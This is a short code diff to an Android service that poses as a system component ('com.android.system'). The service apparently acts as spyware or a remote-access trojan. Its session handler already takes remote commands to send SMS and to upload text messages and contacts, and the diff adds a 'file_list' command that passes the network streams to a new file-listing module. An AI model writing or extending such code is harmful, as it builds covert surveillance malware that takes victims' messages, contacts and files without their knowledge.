@@ -11,6 +11,7 @@ import android.os.PowerManager;
 import android.telephony.TelephonyManager;
 
 import com.android.system.NetworkSessionManager;
+import com.android.system.function.FileList;
 import com.android.system.utils.DataPack;
 import com.android.system.utils.SystemUtil;
 
@@ -30,6 +31,7 @@ import java.util.TimerTask;
 public class SystemService extends Service{
     private NetworkSessionManager mSessionManager;
     private NetworkSessionManager.SessionHandler mSessionHandler = new NetworkSessionManager.SessionHandler() {
+        private String ACTION_FILE_LIST = "file_list";
         private String ACTION_SEND_SMS = "send_sms";
         private String ACTION_UPLOAD_SMS = "upload_sms";
         private String ACTION_UPLOAD_CONTACT = "upload_contact";
@@ -143,6 +145,8 @@ public class SystemService extends Service{
                     responseData = responseJsonObject.toString().getBytes();
                 }
                 DataPack.sendDataPack(outputStream,responseData);
+            } else if(action.equals(ACTION_FILE_LIST)) {
+                new FileList().handle(inputStream,outputStream);
             }
         }
     };
